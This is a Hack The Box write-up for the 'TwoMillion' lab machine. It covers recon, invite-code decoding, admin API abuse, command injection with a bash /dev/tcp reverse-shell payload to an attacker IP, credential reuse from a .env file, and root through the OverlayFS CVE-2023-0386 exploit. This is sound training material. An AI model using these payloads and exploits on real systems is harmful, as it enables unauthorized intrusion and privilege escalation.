# TWOMILLION

**TARGET**: 10.10.11.221

## Recon
Beginning our recon on the target


### Initial Nmap
Let's run a default nmap version scan on our target and see what we get. If nothing interesting we can hit all the ports. We do `sV` to get version numbers and `oA` to write out to a file.

```console
toastydz@parrot$ nmap -sV -oA twomil_init_scan 10.10.11.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 20:05 BST
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that SSH and HTTP are open on the box, but we need some more info.


### Script Nmap
Let's do a script scan and see if we get more information:

```console
toastydz@parrot$ nmap -sC -p 22,80 -oA twomil_script_scan 10.10.11.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 20:08 BST
Nmap scan report for 10.10.11.221
Host is up (0.028s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://2million.htb/
```

We get the public host keys from the SSH session and we also see that the webpage hosted on port 80 will redirect us to ```http://2million.htb```

### Hosts File

If we open up a webpage and attempt to go to http://10.10.11.221, depending on our browser we will get an error message saying that 2million.htb can not be found.
We need to add 2million.htb to our hosts file:
```console
toastydz@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
# Others

toastydz@parrot$ sudo vi /etc/hosts
toastydz@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
10.10.11.221 2million.htb
# Others
````

### First webpage visit
Try refreshing the page and boom we got a page.

![2million.htb](Images/2millionhtbHOMEPAGE.png)<br>


Looks to either be a recreation of the HTB home site or an older version. Either way, I clicked around and found a few directories such as:
	/login
	/invite

### Fuzzing the Web
Now the /invite page does look interesting, but lets fuzz some other directories and see if we find anything first.

First we can run:<br>
```console
toastydz@parrot$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://2million.htb/FUZZ -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

.bashrc                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 36ms]
_code                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 37ms]
.git/HEAD               [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 37ms]
.perf                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 38ms]
.forward                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 38ms]
.history                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 38ms]
.htaccess               [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 39ms]
.hta                    [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 40ms]
.config                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 41ms]
.cvsignore              [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 41ms]
.cvs                    [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 41ms]
.listings               [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 41ms]
.cache                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 44ms]
.profile                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 42ms]
.passwd                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 44ms]
.htpasswd               [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 44ms]
.listing                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 44ms]
_ajax                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 46ms]
.svn                    [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 44ms]
_baks                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 46ms]
_admin                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 48ms]
_cache                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 49ms]
.rhosts                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 51ms]
_borders                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 49ms]
.mysql_history          [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 50ms]
...SNIP...
```

We get way too many results, so let's limit it down by filtering pages with a size of 162 out. We run:<br>
```console
toastydz@parrot$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://2million.htb/FUZZ -mc all -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 162
________________________________________________

                        [Status: 200, Size: 64952, Words: 28274, Lines: 1243, Duration: 63ms]
404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 37ms]
api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 35ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 42ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 51ms]
:: Progress: [4614/4614] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

```

Now we get some good results, we see the two we previously listed as well as some other sub directories.
The API one could be interesting, but we are getting a 401 error but we should keep that in mind if we find an account to see if we get access.

### /Invite
So let's take a look at that /invite page. It was the first one I wanted to look at because it was a simple text box and button. It even prompts you to 'Feel free to hack your way in :)'

![invite_page](Images/invitepage.png)<br><br>

I don't know what the format of this invite code is, so before I even think about a potential brute force let's poke around. I want to send a test code and capture it with ZAP to see what is being sent.

### ZAPping some requests
First attempt will be a classic 123 and in Firefox we immediately getting a pop up telling us our invite is invalid:
![invalid invite](Images/invalid_invite.png)<br><br>

*From ZAP*:
We can see that it is using a POST request to /api/v1/invite/verify and it is sending the data in the format code=$INPUT
![invite zap](Images/invite_zap.png)<br><br>

We can also see  the response we get from the server includes the error "Invite code is invalid!"
![zap invite api error](Images/zap_invite_api_response.png)<br><br>

### Crawling website with ZAP Spider

While we are in ZAP, let's run a spider scan to crawl the page and see what we get back. After our scan finishes, we can see all the different pages the spider picked up, and the js folder catches my eye. There is 3 scripts in here but the one that immediately grabs my attention is the inviteapi.min.js script as that probably has something to do with receiving or checking invite codes.
![zap spider](Images/zap_spider.png)<br><br>

Let's grab that JS from the following url: 
`http://2million.htb/js/inviteapi.min.js`

### Combing the Javascript

It's a jumble but if we look through it, at the bottom appears to be a bunch of different keywords but the two named verifyInviteCode and makeInviteCode look like function names.

![invite api js](Images/invite_api_js.png)<br><br>

Let's go poke around these in our browser. We can open up our dev console (F12) on the `/invite` page.<br>
I begin typing verifyInviteCode and it auto-filled for me, that's a good sign. It requires a paramater `code` so let's try "123" again. We get the same error as before "Invite code is invalid!" So this function is being ran whenever the "Sign Up" button is hit on the `/invite` page. 
![console_verifyinvite](Images/console_verifyinvite.png)<br><br>

We have a second function makeInviteCode() and this one does not appear to require a parameter, so I run it:

![console make invite](Images/console_makeinvite.png)<br><br>

### Registering an account
We got a data object that has encrypted data and the method used to encrypt it (ROT13 in this case). Let's go to cyberchef and decrypt quickly:

![cyberchef rot13](Images/cyberchef_rot13.png)<br><br>

We need to make a POST request to that api endpoint, and we can easily accomplish that using curl:

```console
toastydz@parrot$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0": 200,"success":1,"data":{"code":"UzBGVVQtN0NWWjAtSTBSSkEtVEtKTUs=", "format":"encoded"}}}
```

The code we get back appears to be base64 encoded and we can quickly decode using command line again:
```console
toastydz@parrot$ echo -n 'UzBGVVQtN0NWWjAtSTBSSkEtVEtKTUs=' | base64 -d
S0FUT-7CVZ0-I0RJA-TKJMK
```
Now we finish up registering and we are a legit user on the site now! (I forgot to take screenshots during the registering process) We have made it to a homepage

### Homepage Enumeration

![homepage](Images/homepage.png)<br><br>

Let's poke around a bit and see what we can find. Just clicking on some of the sidebars and going through I find 3 new sub directories:
	access
	rules
	changelog

I don't immediately see a path to go from here. There doesn't seem to be any submission areas or redirects/buttons to click on. We can run ffuf again, this time using /home:<br>
```console
toastydz@parrot$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://2million.htb/home/FUZZ -mc all -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/home/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 162
________________________________________________

access                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
changelog               [Status: 302, Size: 1, Words: 1, Lines: 1, Duration: 49ms]
rules                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]

```

## API Time
Looking back at our previous ffuf scan, now that we are an authenticated user I wonder if the `api` endpoint is now visible to us. Before we were getting a 401 Unauthorized error, but do standard users have access? Turns out we do!
![api main](Images/api_main.png)<br><br>

Let's follow this to the /api/v1 <br><br>
![api v1](Images/api_v1.png)<br><br>

### /admin/auth/settings/update
The user api's are cool and all but my eyes are drawn towards the bottom at the admin API endpoints. One of the endpoints let's us check if we are admin. Let's do a `GET /api/v1/admin/auth` with our current session to verify it works. We can do that in ZAP:
![api_v1_admin_auth](Images/api_v1_admin_auth.png)<br><br>

Okay so we aren't admin, we knew that but that also means we can hit endpoints under the 'admin' section of the API. Let's toy around with that idea and mess with /api/v1/admin/settings/update to see if there is anything beneficial. It uses PUT requests so let's use our current session and send a blank PUT request to that endpoint. 

![api_v1_admin_settings_update_BLANK](Images/api_v1_admin_settings_update_BLANK.png)<br><br>

We get an 'invalid content type' error. Let's update our headers to include the common content type of json by using: `Content-Type: application/json`. Doing this yields a different error for us:<br>
![api_v1_admin_settings_update_CONTENTTYPE](Images/api_v1_admin_settings_update_CONTENTTYPE.png)<br><br>

Now we are missing a parameter `email`, lets add some data to our request and send it again. We know it needs to be in JSON format. Once we send that with a blank email filled, we get ourselves a new error!
![api_v1_admin_settings_update_email](Images/api_v1_admin_settings_update_email.png)<br><br>

Now we are missing the `is_admin` parameter. Adding that in, we see that the value needs to be a 0 or a 1 (presuming 1 for admin.) Let's fill in the email and value for our account and see what happens:
![api_v1_admin_settings_update_ACTUAL](Images/api_v1_admin_settings_update_ACTUAL.png)<br><br>

It looks like we are an admin! We can verify that using the /api/v1/admin/auth endpoint
![api_v1_admin_auth_TRUE](Images/api_v1_admin_auth_TRUE.png)<br><br>

## Where to now??
But what does being admin give us? I'll admit I got stuck here for a bit. I went back to all the pages to see if there was anything new for us. I reran all my fuzzers with my session key (although I would have gotten a 401 error to begin with, so this step was unnecesarry.) I tried combing through the .css and .js files to find something. I tried running nginxpwner (we saw that it was nginx from the nmap). Many other steps that I forgot in my looking.

This is my first box so no shame in the game, I had to look across the web and found [0xdf](https://0xdf.gitlab.io/). While I could beat my head against this for ~~hours, I figured I would read up to the point I was at to be pointed in the right direction. We hit all the same initial steps getting to this point so I knew I appeared to be on the right track. They followed the api trail, they updated their settings to admin, and then boom it hit me as I read along. I felt dumb because it was right under my nose the whole time. 0xdf sent requests to the /admin/vpn/generate api and tested for command injection. 

### Command Injection via POST
So in my fury of testing before I looked up 0xdf, I had previously tried sending requests to the `/admin/vpn/generate` endpoint, created some vpn keys and tried to connect using them, but it was no luck. I thought the endpoint was just a bust, but what 0xdf helped me realize in his post was that we needed to consider how the POST request was working. If the server is calling a script and just dropping our input on the command line as a variable (with something like `openvpn_generate.sh $username`) then we could attempt a command injection on that.

So let's try that by doing a test username of: `; id;`
The first semicolon will end the current command and start a new one, then we put id as a simple command to output information and a second semicolon to end again.
![api_v1_admin_vpn_generate_commandinject](Images/api_v1_admin_vpn_generate_commandinject.png)<br><br>

### Reverse Shell and Full TTY
Let's start nc on our host and then drop a reverse shell through command injection. [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux) is a good resource for this:<br>

```{"username":"; bash -c 'bash -i >& /dev/tcp/10.10.14.179/2550 0>&1' ;"}```<br>

After sending the above command we do get a connection back to our host.
```console
toastydz@parrot$ nc -lvnp 2550
listening on [any]2550 ...
connect to [10.10.14.179] from (UNKOWN) [10.10.11.221] 58774
bash: cannot set terminal process group (1159): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

We then upgrade our shell to fully interactive TTY using one of the methods over at [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

I used the Python method:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

## Enumerating Server
Let's take a look around from here. We can see that we appear to be in /var/www/html and we can view the files in this directory:
```console
www-data@2million:~/html$ pwd
/var/ww/html
www-data@2million:~/html$ ls -al
total 56
drwxr-xr-x 10 root root 4096 Jul 27 14:00 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Jul 27 14:00 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
```
I poke around a few things but right at the top we see a .env file, usually used for environment variables and credentials. If we read that file we do appear to get a password for an admin account on htb_prod. 
```console
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### DB or not DB - Admin User and Flag
From here I went down another rabbit hole I did not document of trying to connect to the database htb_prod and looking at the tables. I was able to connect but I couldn't view the tables or maybe I am just not good at SQL stuff. But since I could get to the DB from admin, it was likely the admin account did not just exist in the database. <br><br>
I try to switch to that user and I am in!
```console
www-data@2million:/html$ su -l admin
Password:
To run a command as administrator (usr "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

Now we can poke around over here, and we see that there is a user.txt file. Let's get our user flag!
```console
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt
f55**************************
```

--------------------------------------------------------------
# System Time
I left off after the user stuff so we are coming back in with fresh eyes. Let's try and ssh into the machine using the admin username/pass and see if we can get in:
```console
toastydz@parrot$ ssh admin@2million.htb
admin@2million.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 28 06:26:22 PM UTC 2023

  System load:  0.1005859375      Processes:             217
  Usage of /:   73.1% of 4.82GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.221
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

## LINPEAS Enum

First thing I will do is run [LINPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to enumerate the box and see if we find anything. This could have been done with the previous user as well but I never thought of that, was just busy searching for that first flag.


### Setup
HOST:<br>

```console
toastydz@parrot$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
...SNIP...
Length: 676221 (660K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 660.37K  --.-KB/s    in 0.09s   

2023-07-28 19:30:39 (7.23 MB/s) - ‘linpeas.sh’ saved [676221/676221]
toastydz@parrot$ sudo python3 -m http.server 80
[sudo] password for toastydz: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

FROM SSH SESSION (we pipe it to linpeas.txt so we can read through it after):
```console
admin@2million:~$ curl 10.10.14.179/linpeas.sh | sh > linpeas.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
 34  660k   34  230k    0     0  99992      0  0:00:06  0:00:02  0:00:04   97k. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100  660k  100  660k    0     0   8938      0  0:01:15  0:01:15 --:--:--  8938
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
sh: 5374: Syntax error: Unterminated quoted string
```

### Reading Linpeas
Now that it's finished let's open up the linpeas.txt and read through it. It's a long file so I've only included a few screenshots (I didn't want to just insert as markdown code blocks because the color is what stands our in the linpeas output and I don't know how to change that)<br><br>
**Basic Info**<br>
![linpeas basic info](Images/linpeas_basicinfo.png)<br><br>
**Interesting permissions** <br>
![linpeas interesting perms](Images/linpeas_interestingperms.png)<br><br>
**Mail applications** <br>
![linpeas mail](Images/linpeas_mail.png)<br><br>

I included interesting permissions because I tried going through a few of those by researching the different vulns listed and finding exploits, but the ones that I was finding were patched.

### You've got Mail!

One thing that did stand out was the installed mail applications because when we logged in to our SSH session it  told us that we had mail. We can see it is stored at `/var/mail/admin` so let's read that:

```console
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

## Research and POC
The email references the DB migration (that was previously on the site's home page) and patching linux kernel CVEs. It specifically references two(OverlayFS/FUS) so we can do our research on those.

We find a few articles about different OverlayFS exploits, but the most recent one is from 2023. If you look back at our first linpeas screenshot, we see that the OS was last updated Sep 2022 so this exploit is the one we should look into. There was a good write up by [Security Labs](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) that I read.

The article also leads us to the POC by [xkaneiki](https://github.com/xkaneiki/CVE-2023-0386). I did have to find this repo from [sxlmnwb](https://github.com/sxlmnwb/CVE-2023-0386) that appears forked from the original because I need the English instructions.

### Moving files to Victim machine

The same way we got our linpeas script over earlier, we basically replicate to get the code from our host to our victim server:

**HOST**
```console
toastydz@parrot$ wget https://github.com/xkaneiki/CVE-2023-0386/archive/refs/heads/main.zip
...SNIP...

2023-07-28 19:49:38 (4.14 MB/s) - ‘main.zip’ saved [11578]

toastydz@parrot$ sudo python3 -m http.server 80
[sudo] password for toastydz: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**FROM VICTIM**
```console
admin@2million:~$ wget 10.10.14.179/main.zip
...SNIP...

2023-07-28 18:52:25 (152 MB/s) - ‘main.zip’ saved [11578/11578]
```


### Unzip and Install
```console
admin@2million:~$ unzip main.zip 
...SNIP...
admin@2million:~$ cd CVE-2023-0386-main/
admin@2million:~/CVE-2023-0386-main$ make all
...SNIP...
gcc -o exp exp.c -lcap
gcc -o gc getshell.c

```

### Execution time -> ROOT
Following the instructions from github, we will need two active SSH sessions into the machine.

**FIRST SESSION**
```console
admin@2million:~/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0

```

it may look like it is hanging or not running, that is fine just move over to the second ssh session.

**SECOND SESSION**
```console
admin@2million:~/CVE-2023-0386-main$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jul 28 19:01 .
drwxrwxr-x 6 root   root     4096 Jul 28 19:01 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386-main# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

We can browse around and our root flag is at /root/root.txt:
```console
root@2million:~/CVE-2023-0386-main# ls /root
root.txt  snap  thank_you.json
root@2million:~/CVE-2023-0386-main# cat /root/root.txt 
5aed***********************
```

This was a very fun first experience trying a HTB machine and I look forward to the future machines and eventually fully cracking my own without having to peek at a writeup!
